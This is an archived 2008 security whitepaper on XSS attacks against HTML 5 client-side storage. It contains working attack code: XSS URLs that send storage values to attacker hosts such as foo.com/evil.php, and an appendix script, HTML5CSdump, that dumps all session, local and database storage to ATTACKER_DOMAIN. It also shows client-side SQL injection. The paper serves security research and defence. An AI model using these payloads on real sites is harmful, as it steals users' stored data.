---
type: Whitepaper
title: Abusing HTML 5 Structured Client-side Storage
description: "Session, global, local and Database Storage have no HTTPOnly, no path scoping and no port scoping, so one XSS anywhere on a host reads all of it. Enumerate keys with for(i in sessionStorage), find databases by testing window[i]==\"[object Database]\", pull schema from sqlite_master, then exfiltrate with the HTML5CSdump script given in full. Covers cross-directory, cross-domain and client-side SQLi."
resource: "http://trivero.secdiscover.com/html5whitepaper.pdf"
tags: [whitepaper, webseclist-reference, xss, sqli, info-leak, javascript, dom, same-origin-policy, database, novel-technique, owasp-a01-2021, owasp-a03-2021]
generated:
  by: webseclist-refs/1
  at: "2026-08-07T09:50:52+00:00"
status: deprecated
stale_after: 2027-08-07
sources:
  - id: original
    resource: "http://trivero.secdiscover.com/html5whitepaper.pdf"
    title: Abusing HTML 5 Structured Client-side Storage
    author: Alberto Trivero
also_at: []
authors:
  - Alberto Trivero
canonical_url: ""
cited_by:
  - "2008.md:10"
commit: ""
content_sha256: b79cc45c8f61583752213047f0eed41e36e8663ae695403384331c9b3f98fee3
depth: full
depth_reason: default
kind: whitepaper
language: ""
licence: unknown
original_url: "http://trivero.secdiscover.com/html5whitepaper.pdf"
published: ""
publisher: ""
publisher_english: ""
raw_sha256: 0ddaf42ba4ec4ac75fdb109bc87f80612867ca46ad4ebe6f2e7eaf2b2921e486
retrieved_from: "http://trivero.secdiscover.com/html5whitepaper.pdf"
retrieved_kind: manual-import
retrieved_utc: "2026-08-07T09:50:52+00:00"
slug: abusing-html-5-structured-client-side-storage
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# Abusing HTML 5 Structured Client-side Storage

**Abusing HTML 5 Structured Client-side Storage** - Alberto Trivero, Publisher not stated.

- Published: date not stated
- Original: <http://trivero.secdiscover.com/html5whitepaper.pdf>
- Preserved from: http://trivero.secdiscover.com/html5whitepaper.pdf (manual-import) on 2026-08-07
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# Abusing HTML 5 Structured Client-side Storage

Abusing HTML 5 Structured
Client-side Storage

                                                  ALBERTO TRIVERO

First release: 20 July 2008
Latest revision: 17 October 2008

                                   Sponsored by
Alberto Trivero     Abusing HTML 5 Structured Client-side Storage   a.trivero(*)secdiscover.com   www.secdiscover.com

Table of Contents

    Introduction                                                                                                   2
    HTML 5 Structured Client-side Storage                                                                          2
        Browser’s Implementation                                                                                   2
        Session Storage                                                                                            3
        Local Storage (ex Global Storage)                                                                          3
        Database Storage                                                                                           3
    Some Boring (in)Security                                                                                       4
        Strange Behavior                                                                                           4
    Abusing HTML 5 Structured Client-side Storage                                                                  5
        Storage Object Enumeration                                                                                 5
        Database Object Enumeration                                                                                6
        Extracting Database Metadata                                                                               6
        One Shot Attack                                                                                            6
        Attack Automation: HTML5CSdump                                                                             6
        Cross-directory Attacks                                                                                    7
        Cross-domain and Cross-port Attacks                                                                        7
        Client-side SQL Injection Attacks                                                                          8
    Conclusions                                                                                                    8
    References                                                                                                     8
    Appendix A                                                                                                   10

                                                              1
Alberto Trivero       Abusing HTML 5 Structured Client-side Storage         a.trivero(*)secdiscover.com      www.secdiscover.com

Introduction
Client-side storage is at the heart of modern web technologies and it’s very important for many web developers. Currently
most common web browsers use different techniques to store data in the client’s machine and, surely, the most famous, old
and simple way to do this are HTTP cookies [1].

Although sometimes browser specific or plugin dependent, other techniques have been developed during the years in order
to supply the structural limitation of HTTP cookies. Most common examples are:

• userData, used only by Internet Explorer 5.5 and later [2];

• Local Shared Object, used by the browser plugin Adobe Flash Player 6 and later [3];

• Google Gears, a plugin for Firefox and Internet Explorer [4];

To adapt to modern and future web technologies, resolve this chaos and create a widely accepted standard, the Web
Hypertext Application Technology Working Group (WHATWG) [5] with the W3C HTML Working Group [6] has developed a
well structured client-side storage solution, which is part of the future major revision of the core language of the World Wide
Web: HTML 5. The First Public Working Draft of HTML 5 has been released on 22th January 2008 [7], but the work has
been started since 2004 with the name Web Applications 1.0, changed in May 2007, and continue every day [8]. There are
many changes in HTML 5 and although it’ll probably reach the W3C Candidate Recommendation state only in 2012, several
browsers has already adopted some of them.

The aim of this white paper is to analyze security implications of this new client-side storage technology, showing how
different attacks can be conduct in order to steal storage data in the client’s machine.

HTML 5 Structured Client-side Storage
Structured client-side storage [9], this is the complete name of the storage solution adopted by HTML 5, is probably the
most interesting innovation for who deals with IT security. It’s divided in three different client-side storage methodologies:

• Session Storage

• Local Storage (ex Global Storage)

• Database Storage

In Firefox [10] and Internet Explorer [11] takes the name of DOM Storage, a name someone doesn’t like [12].

Browser’s Implementation
As previously stated, many browsers has already started to implement many new features of HTML 5. Let’s see what is the
situation for client-side storage analyzing the most commons rendering engine.

• Gecko, used by Firefox and many more, allows session storage and global storage since version 1.8.1 (Firefox 2.0,
  October 2006);

• WebKit, used by Safari and recently implemented in Qt 4.4, allows database storage since version r27xxx (introduced
  subsequently in Safari 3.1, March 2008), and since development version r34xxx (and probably since future 4.0 version of
  Safari) allows also local storage and session storage;

• Trident, used by Internet Explorer, allows session storage and local storage since version VI (IE 8 beta 2, August 2008);

• Presto, used by Opera 9.60, doesn’t supports anything of the HTML 5 client-side storage.

Could be interesting to know quickly which of the tree typologies of client-side storage your browser support, without the
need to try to search the answer in the online documentation. To accomplish this task you can use this simple JS script:

var storSupp = "";
if("sessionStorage" in window) { storSupp += "Session Storage "; }
if("globalStorage" in window) { storSupp += "Global Storage "; }
if("localStorage" in window) { storSupp += "Local Storage "; }

                                                                  2
Alberto Trivero       Abusing HTML 5 Structured Client-side Storage         a.trivero(*)secdiscover.com       www.secdiscover.com

if("openDatabase" in window) { storSupp += "Database Storage "; }
document.write(storSupp);

Session Storage
Session storage is quite similar to HTTP cookies but has some relevant benefits: there’s much more storage capacity (some
MB, depending on the browser’s implementation, instead of only 4 kB), it doesn’t need to be transmitted in every HTTP
packet and it’s more efficient in different situations. Session storage objects are key/value pairs (where value is a string) that
will be accessible only by the origin [13] and only in the window (or tab) where they were created.

HTML 5 draft makes the example of a user who buys at the same time two plane tickets from the same site using two
different windows, if the web application uses HTTP cookies to keep track of which ticket the user is buying, the purchase
made in one window could leak into the other one. With session storage this couldn’t happen. Unlike cookies you can’t
define the persistence time of the storage object: it’ll disappear when the user close the window where it was created or
when the web application deletes it.

You can define a session storage object in this manner: sessionStorage.foo = “bar”;

Local Storage (ex Global Storage)
To store persistent data on the client’s machine, HTML 5 has used global storage since the new Working Draft released on
the 10th of June 2008 that officially introduces local storage. Global storage allow a web application to store data on the
client’s computer that can be accessed by other domains different from the one have created the storage object. According
to the specifications, you can define a global storage object accessible from every domain (globalStorage[‘’].foo =
“bar”;), from a specific top level domain (globalStorage[‘com’].foo = “bar”;), and so on going down in levels
(globalStorage[‘example.com’].foo = “bar”;, ...). All the domains at an equal or lower level of the one defined
for a global storage object can access its storage data. This is what specs say. As usual browser developers has adopted a
little different behavior (in this case with a good margin of reason). Firefox 2.0 & 3.0 has never allowed public data storage or
the use of TLD, Firefox 3.0 has moreover blocked the permission for subdomains to access data of a domain in a higher
level: you can access a global storage object only from the exactly same domain it’s referred.

With local storage, the new and better version of global storage, you can’t define domains, it’s automatically associated with
the origin of the web application is running the script. It’s important to note that WebKit and Internet Explorer 8 beta 2 allow
subdomains to access data of their superior domain, contrary to what specifications say.

Both global storage and local storage are accessible from any browser’s window and their data persists also when the
browser is closed, unlike session storage.

Some simple examples are:

localStorage.foobar = 1337;
globalStorage['example.com'].foo = "bar";
globalStorage[location.hostname].pg = “The quick brown fox jumps over the lazy dog”;

Firefox 3.0 saves these persistent data, under Mac OS X, in this SQLite file:

/Users/[username]/Library/Application Support/Firefox/Profiles/[random string]/
webappsstore.sqlite

and under Windows XP in this one:

C:\Documents and Settings\[username]\Application Data\Mozilla\Firefox\Profiles\[random
string]\webappsstore.sqlite

Database Storage
Similarly to Google Gears, HTML 5’s database storage allows a web application to save structured data in the client’s
machine using a real SQL database. This feature will allow the development of very powerful applications. A simple example
[14] was released by the developers of WebKit, the only that now supports database storage.

                                                                 3
Alberto Trivero          Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com       www.secdiscover.com

Like the other two storage methodologies, you can save only strings and data will be accessible solely by the exactly same
origin has created it.

The syntax could create some problems at a first approach. For a complete reference see the HTML 5 draft [15]. Now I’ll
show you only some quick and simple examples:

db = openDatabase("dbTest", "1.0", "First Database", 300000);
db.transaction(function(tx) { tx.executeSql("CREATE TABLE MyTb (id REAL)"); });
db.transaction(function(tx) { tx.executeSql("SELECT * FROM MyTb”, [], function(tx,
result) { alert(result.rows.item(0)['id']); }); });

WebKit (therefore Safari and so on) uses SQLite as database backend. Under Mac OS X you can find its storage files in:

/Users/[username]/Library/Safari/Databases

Could be useful to use the Safari’s Web Inspector to navigate through the content of a site’s local database and forgering
SQL queries.

Some Boring (in)Security
At this point we can draw the first conclusions about security implications of HTML 5 structured client-side storage.

First of all, due to the absence of the ability to set an expiration date, if a session storage object is saved on the user’s
machine, not deleted when necessary, and the user continue to surf on the Internet using always the same window, that
object will be recoverable also many hours or even days after it has finished its usefulness.

The freedom in global storage to set the domain name will access the storage data could cause an unwanted leak of data.

There’s moreover any integrity check of persistent storage data, they are saved in simple and easy discoverable SQLite files.

One of the always valuable ways to reduce the attack surface is to erase data and informations are not useful anymore.
Considering this, it’s not positive to know Firefox 3.0 didn’t adopted the clear() method (Internet Explorer 8 do) to allow
web developers to quickly empty the associated object (session storage, global storage or local storage) of all its key/value
pairs. A developer have to use the removeItem(key) method for each key he need to delete.

Moreover currently neither Firefox nor Internet Explorer and Safari allow you to manage in a decent way the content of HTML
5 client-side storage. You can’t easily see or delete it. Only Safari allow it for database storage.

Strange Behavior
Billy Hoffman and Bryan Sullivan in their Ajax Security book [16] have pointed out some strange stuffs could have security
implications. I’ll discuss them here with some more details using development builds of Safari and Internet Explorer.

Consider this simple piece of code:

sessionStorage.foo = false;
if(sessionStorage.foo) {
        alert("true");
}
else {
        alert("false");
}

It’s quite obvious to say it’ll show false. Well, it show true instead, on every browser. Why? As stated at the beginning, the
three storage methodologies store strings, this is the point. typeof(sessionStorage.foo) return object on Firefox 2.0
& 3.0, and return string on Internet Explorer 8 beta 2 and on the development builds of WebKit (which is the correct
behavior), but never return boolean. So, depending to the browser, our keys are managed, and converted, as strings or
objects. So how to obtain false, as expected? With WebKit we can use sessionStorage.foo = ‘’;, but with Firefox
and Internet Explorer it’s been impossible, for me, to obtain false, even using toString(), quite odd. This strange facts makes
very easy to write buggy JavaScript code that could create unintended and potentially insecure behaviors.

                                                                   4
Alberto Trivero       Abusing HTML 5 Structured Client-side Storage          a.trivero(*)secdiscover.com       www.secdiscover.com

Abusing HTML 5 Structured Client-side Storage
Although researchers like Ronald van den Heetkamp [17] have already underlined the risks of client-side storage in HTML 5
and others like Petko D. Petkov dealed with similar technologies [18], anyone has done an in-depth analysis yet.

Let's make a first consideration: if a web application which uses this kind of client-side storage is vulnerable to XSS (Cross-
site scripting) attacks we can use an attack payload to read or modify the content of known storage keys (session storage,
global storage, local storage or database storage) on the computer’s victim. If the web application loads data or code from
the local storage, could be also quite powerful to inject malicious code that will be executed every time the web application
will request it.

Obviously also CSRF (Cross-site request forgery) attacks could be very interesting.

With this big amount of client-side data, client-side attacks can see grow their capabilities. Cookies stealing is noting
compared to what can be done in a near future, and there’s no HTTPOnly to protect you.

Also spy cookies will begin to be obsolete: with HTML 5 client-side storage you have much more ways to track the users’
preferences.

Persistent storage like global storage, local storage and database storage could easily be used to build persistent XSS
attacks, the lifeblood of web worms. Maybe it’s not exaggerate to say that in the future many megabytes of data of millions
of users could be at risk.

Moreover, when a computer is compromised or stole, a good place to find interesting data it’s obviously local storage.

The enthusiasm of web developers toward HTML 5 client-side storage is probably one of the worst element in the security
point of view (you now, human factor..). Let’s see what a web technologist has wrote on his blog:

“Imagine a personal finance site storing your stock portfolio and historical prices locally, [...] your favorite blogging tool might
already use local storage to automatically save drafts of your blog posts, [...] a personalized homepage might store your
selected widgets and their content locally, [...] web applications such as Google Calendar might store your appointments
locally, [...] your webmail will be downloaded locally [...]. I'm excited to see more applications start to use client-side storage”,
Niall Kennedy [19].

Well, from a different point of view, what do you think if someone, from anywhere in the world, could gain access to your
stock portfolio seeing what stocks you own, to the drafts of your blog posts (reserved or not), to your web widgets and their
content, to your agenda, to all your mails without the need of cookies or passwords, and so on. And maybe imagine a script
able to gain all this sort of information in an automated fashion. Yeah, I’m excited too..

Storage Object Enumeration
If you want to acquire the value of a storage object using a XSS payload, you usually need to know the name of its key,
which could be a limitation. To overcome this problem we’ll see two scripts that allow you to acquire all the keys for session
storage, global storage and local storage:

var ss = "";
for(i in window.sessionStorage) {
        ss += i + " ";
}

This example is for session storage, but could by easily used for the other storage methodologies. We can obtain the same
result, in this case for local storage, with the API supplied by the HTML 5 draft:

var ls = "";
for(i = 0; i < localStorage.length; i++) {
        ls += localStorage.key(i) + " ";
}

                                                                  5
Alberto Trivero        Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com      www.secdiscover.com

Database Object Enumeration
The HTML 5 draft says that “there is no way to enumerate or delete the databases available for a domain from this API”. So
if we want to know the content of a database object without knowing its name, we have to use some escamotages:

var db = "";
for(i in window) {
        if(window[i] == “[object Database]”) {
                  db += i + “ “;
        }
}

Extracting Database Metadata
If you know everything of the structure of a client-side database you can do everything you want with it, but if you don’t, you
have to extract its structure in some way. We have said before that WebKit uses SQLite for database storage. Every SQLite
database has a table called sqlite_master containing the names of all the tables of the database. To gain them you can
use a SQL query like this one:

SELECT name FROM sqlite_master WHERE type='table'

Once you have a table name you probably want to knows its columns. The sqlite_master table has a column called sql
which contains the SQL CREATE statement for a certain table where you can see its columns:

SELECT sql FROM sqlite_master WHERE name='table_name'

If you’re asking yourself which version of SQLite uses WebKit, the answer is 3.4.0, released about a year ago (the latest
available is 3.6.1):

SELECT sqlite_version()

One Shot Attack
What makes uncomfortable client-side attacks is the difficulty to constantly interact with the target. Let’s see now a classic
XSS attack scenario where I acquire client-side data thanks to my knowledge of its structure (keys names, database objects
name, database tables names, etc.):

http://example.com/page.php?name=<script>document.write('<img src="http://foo.com/
evil.php?name=' %2B globalStorage[location.hostname].mykey %2B '">');</script>

Example.com has a XSS vulnerability in the name variable and uses global storage to save an object on the client’s machine
which have a key named mykey. If a site’s user click on that URL, the value of mykey is sent to the attacker’s domain
foo.com and stored. Quite simple.

http://example.com/page.php?name=<script>db.transaction(function (tx) { tx.executeSql
("SELECT * FROM client_tb", [], function(tx, result) { document.write('<img src="http://
foo.com/evil.php?name=' %2B result.rows.item(0)['col_data'] %2B '">'); }); });</script>

In this case we are attacking database storage of example.com instead. If a site’s user click on that URL, the content of the
column col_data in the first row of the table client_tb is sent to the attacker’s page and stored.

Attack Automation: HTML5CSdump
We’ve seen before some ways to acquire data when we know anything about it. We can imagine a user uses a XSS
vulnerable site with HTML 5 client-side storage, but we can’t discover enough information to acquire directly its client-side
data, or we haven’t enough time. To solve this problem I’ve developed a JS script called HTML5CSdump. This script uses
the enumeration and extraction techniques described before to obtain all the client-side storage relative to a certain domain
name without the need of any user interaction (except to click on a link) and without the need for the attacker to analyze the
structure of the web application. The script is available at the appendix A of this white paper and at this address: http://
trivero.secdiscover.com/html5csdump.js

                                                                 6
Alberto Trivero       Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com     www.secdiscover.com

An example to inject the script in a XSS vulnerable page is this:

http://example.com/page.php?name=<script src=http://foo.com/evil.js></script>

An example of the script’s output is this:

As you can see the script gives to the attacker informations on the user agent of the victim, what client-side storage
methodologies it supports, and all the content of the storage data for the attacked domain.

Cross-directory Attacks
HTTP cookies has a Path attribute that define where the cookie is valid and so from where it can be read. Nothing similar
exists for HTML 5 client-side storage. This means that a XSS flow in any page of a site could be used to obtain client’s data.
This is not good in a prospective of minimizing the attack surface.

As a consequence is also absolutely discouraged the use of HTML 5 client-side storage in site like geocities.com,
myspace.com, livejournal.com, etc. where a web space is offered to the user in the form http://domain.com/username/.

Cross-domain and Cross-port Attacks
Cross-domain attacks are feasible against global storage in Firefox 2.0, and can happen when there are weak domain
restrictions. Imagine a user who uses admin.example.com which saves on his computer
globalStorage[‘example.com’].privID = 31337, now if someone has the control of, for example,

                                                                7
Alberto Trivero        Abusing HTML 5 Structured Client-side Storage         a.trivero(*)secdiscover.com       www.secdiscover.com

employers.example.com or exploit a XSS vulnerability, can easily access to that global storage object. Firefox 3.0 doesn’t
allow anymore this kind of attacks.

Because you can’t restrict the access port (IE’s userData do), cross-port attacks are possible when two web servers (or
other XSSable services) runs on the same domain since each one can access to the client-side storage of the other one.
Again, this is not good in a prospective of minimizing the attack surface.

Client-side SQL Injection Attacks
SQL injection attacks were always be considered as server-side problem, but already with Google Gears [18] is begun also a
client-side problem. In HTML 5 the problem exists when the query parameters are not passed though the ? placeholder but
directly. This is the wrong use:

executeSql("SELECT name FROM stud WHERE id=" + input_id);

This is the correct use:

executeSql("SELECT name FROM stud WHERE id=?", [input_id]);

The problem with client-side SQL injection attacks is that the exploitability is very variable and usually quite low. In fact
supposing you are able to execute a classical UNION SELECT to extract from the local database the data you desire, then
how can you send it to yourself? You can’t, you can only hope in a favorable design of the web application which allow you
to obtain it in an other way (for example storing persistently in a web page the result of the malicious SQL query).

It’s also interesting to note that not all the SQL statements which SQLite supports are allowed by WebKit. For example
PRAGMA (which could allow to obtain interesting information on the database structure) and ATTACH (could be used to
attach external databases, a big deal in Firefox) are blocked. HTML 5 draft doesn’t define yet what SQL statements have to
be allowed, we’ll see when also Firefox, Internet Explorer and Opera will support database storage, if they make the mistake
to allow these potentially dangerous statements.

Conclusions
It’s quite obvious with the passage of time the attack surface for web applications will grow. HTML 5 structured client-side
storage is a powerful instrument for web developers, but introduces new relevant risks. In this white paper we’ve seen some
attack scenarios against it and some scripts that simplify and improve the attacks.

This storage technology for the moment is not yet very implemented, but for sure in the next months we’ll see exponentially
grow its adoption thanks for the support by the browser’s vendors and the passion web developers have for it.

Finally browser’s vendors should allow much more control to the end users to see and manage the HTML 5 client-side
storage and, since deprecated, I would like to see global storage being removed in favor of the better local storage. But
browser vendors rarely remove features, we’ll see what will happen.

References
[1] http://tools.ietf.org/html/rfc2965
[2] http://msdn.microsoft.com/en-us/library/ms531424(VS.85).aspx
[3] http://en.wikipedia.org/wiki/Local_Shared_Object
[4] http://gears.google.com/
[5] http://www.whatwg.org/
[6] http://www.w3.org/html/wg/
[7] http://www.w3.org/TR/2008/WD-html5-20080122/
[8] http://www.w3.org/html/wg/html5/
[9] http://www.whatwg.org/specs/web-apps/current-work/multipage/structured-client-side-storage.html#structured-client-
side-storage
[10] http://developer.mozilla.org/En/DOM:Storage
[11] http://msdn.microsoft.com/en-us/library/cc197062(VS.85).aspx

                                                                 8
Alberto Trivero      Abusing HTML 5 Structured Client-side Storage       a.trivero(*)secdiscover.com   www.secdiscover.com

[12] http://ejohn.org/blog/dom-storage-answers/
[13] http://www.whatwg.org/specs/web-apps/current-work/multipage/browsers.html#origin-0
[14] http://webkit.org/misc/DatabaseExample.html
[15] http://www.whatwg.org/specs/web-apps/current-work/multipage/structured-client-side-storage.html#sql
[16] http://www.informit.com/store/product.aspx?isbn=0321491939
[17] http://www.0x000000.com/?i=365
[18] http://www.gnucitizen.org/blog/client-side-sql-injection-attacks/
[19] http://www.niallkennedy.com/blog/2007/01/ajax-performance-local-storage.html

                                                               9
Alberto Trivero   Abusing HTML 5 Structured Client-side Storage   a.trivero(*)secdiscover.com   www.secdiscover.com

Appendix A
/*/
 * HTML5CSdump v0.6 - August 2008
 * This JavaScript code will dump in an automated fashion ALL the content of the
 * HTML 5 Client-side Storage technology of the attacked domain.
 * Download the last version at: http://trivero.secdiscover.com/html5csdump.js
 * Related white paper: http://trivero.secdiscover.com/html5whitepaper.pdf
 * Coded by Alberto 'ameft' Trivero - a.trivero(*)secdiscover.com
/*/

var dump_ss = "";
var dump_gs = "";
var dump_ls = "";
var dump_db = "";
var storage_support = "";
var ua = navigator.userAgent + "%0D%0A";

if("sessionStorage" in window) {
      if(storage_support) { storage_support += "%2C%20"}
      storage_support += "Session%20Storage";
      for(i = 0; i < sessionStorage.length; i++) {
            dump_ss += "window%2EsessionStorage%2E" + sessionStorage.key(i) + "%20%3D%20" +
sessionStorage.getItem(sessionStorage.key(i)) + "%0D%0A";
      }
}

if("globalStorage" in window) {
      if(storage_support) { storage_support += "%2C%20"}
      storage_support += "Global%20Storage";
      for(i = 0; i < globalStorage[location.hostname].length; i++) {
            dump_gs += "window%2EglobalStorage%5B%27" + location.hostname + "%27%5D%2E" +
globalStorage[location.hostname].key(i) +
                           "%20%3D%20" +
globalStorage[location.hostname].getItem(globalStorage[location.hostname].key(i)) + "%0D%0A";
      }
}

if("localStorage" in window) {
      if(storage_support) { storage_support += "%2C%20"}
      storage_support += "Local%20Storage";
      for(i = 0; i < localStorage.length; i++) {
            dump_ls += "window%2ElocalStorage%2E" + localStorage.key(i) + "%20%3D%20" +
localStorage.getItem(localStorage.key(i)) + "%0D%0A";
      }
}

if("openDatabase" in window) {
      if(storage_support) { storage_support += "%2C%20"}
      storage_support += "Database%20Storage";
      for(var j in window) {
            if(window[j] == "[object Database]") {
                  dump_db += "Database%20object%3A%20window%2E" + j + "%0D%0A";
                  var sql = window[j];
                  sql.transaction(function (tx) {
                        tx.executeSql("SELECT name FROM sqlite_master WHERE type='table'", [],
function(tx, result) {
                              for(i = 0; i < result.rows.length; i++) {
                                    var row = result.rows.item(i);
                                    if(row['name'] != "__WebKitDatabaseInfoTable__") { //
inaccessible table created by WebKit
                                          dump_db += "Table%20name%3A%20" + row['name'] + "%0D%0A";
                                          sql.transaction(function (ty) {
                                                ty.executeSql("SELECT sql FROM sqlite_master WHERE
name=?", [row['name']], function(ty, result2) {
                                                      var dbSchema = result2.rows.item(0)['sql'];
                                                      var theRegExp = /^[^(]*\(`/;
                                                      var columns = dbSchema.split(theRegExp);

                                                           10
Alberto Trivero   Abusing HTML 5 Structured Client-side Storage        a.trivero(*)secdiscover.com   www.secdiscover.com

                                                                  var theRegExp = /`[^`]*[`)]/;
                                                                  columns = columns[1].split(theRegExp);
                                                                  columns.splice(columns.length - 1); // remove
the last element of 'columns': is null
                                                     dump_db += "Database%20schema%3A%0D%0A" +
columns.join("%09") + "%0D%0A%09%09%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%2D%0D%0A";
                                                     sql.transaction(function (tz) {
                                                           tz.executeSql("SELECT * FROM " +
row['name'], [], function(tz, result3) { // you can't use the ? placeholder to specify the table
name
                                                                 for(i = 0; i < result3.rows.length;
i++) {
                                                                       for(k = 0; k <
columns.length; k++) {
                                                                             dump_db +=
result3.rows.item(i)[columns[k]] + "%09";
                                                                       }
                                                                       dump_db += "%0D%0A";
                                                                 }
                                                           });
                                                     });
                                               });
                                          });
                                    }
                              }
                        });
                  });
                  dump_db += "%0D%0A";
            }
      }
}

alert(dump_db); // to be resolved!

var dump_res = "User%20Agent%3A%20" + ua +
               "HTML%205%20Structured%20Clien%2Dside%20Storage%20Support%3A%20" + storage_support +
               "%0D%0A%0D%0A%09%3D%20SESSION%20STORAGE%20%3D%0D%0A%0D%0A" + dump_ss +
               "%0D%0A%0D%0A%09%3D%20GLOBAL%20STORAGE%20%3D%0D%0A%0D%0A" + dump_gs +
               "%0D%0A%0D%0A%09%3D%20LOCAL%20STORAGE%20%3D%0D%0A%0D%0A" + dump_ls +
               "%0D%0A%0D%0A%09%3D%20DATABASE%20STORAGE%20%3D%0D%0A%0D%0A" + dump_db;

document.write('<img src="http://ATTACKER_DOMAIN/evil.php?name=' + dump_res + '">');

                                                           11
